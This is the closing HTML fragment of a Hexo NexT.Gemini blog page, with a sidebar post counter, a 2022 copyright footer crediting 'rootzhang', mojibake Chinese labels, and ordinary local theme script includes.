<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">28</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">rootzhang</span>
</div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> å¼ºåŠ›é©±åŠ¨
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
